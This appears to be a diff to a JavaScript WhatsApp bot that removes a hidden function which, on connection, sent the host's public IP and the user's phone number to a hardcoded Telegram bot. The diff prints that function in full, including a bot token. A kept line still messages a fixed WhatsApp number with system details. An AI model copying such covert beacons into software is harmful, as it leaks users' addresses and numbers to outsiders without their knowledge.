@@ -170,7 +170,6 @@ async function start() {
             const formattedPingSpeed = pingSpeed < 0 ? 'N/A' : `${pingSpeed}ms`;
             const infoMsg = `Helloo, Your WhatsApp bot is now active.\n\n*[ About the system ]*\nSpeed: ${formattedPingSpeed}\nDate:  ${currentTime.toDateString()}, ${currentTime.toLocaleDateString('id-ID', { weekday: 'long' })}\nCurrent Time: ${currentTime}`;
             await sock.sendMessage(`6281398274790@s.whatsapp.net`, { text: infoMsg, mentions: [owner + '@s.whatsapp.net', jid] }, { quoted: null });
-            await acecepuh();
         }
         });
 
@@ -252,12 +251,6 @@ async function start() {
   return sock
 }
 start()
-
-async function acecepuh() {
-  let ipe = await axios.get("https://api.ipify.org");
-  let capti = "Hai sensei aku sukses tersambung dengan Ip : " + ipe.data + " Dan nomor user : " +  sock.user.jid.split('@')[0]
-    return axios.post("https://api.telegram.org/bot7125755416:AAHbqGMI1HJwai552LUlS7cBx1u47R7XV5Y/sendPhoto?chat_id=6954841951&photo=https://i.ibb.co.com/NZQcJCj/116322992-p0-square1200.webp&caption=" + capti).catch(console.error)
-}
 
 /** realod file **/
 let file = fileURLToPath(import.meta.url)
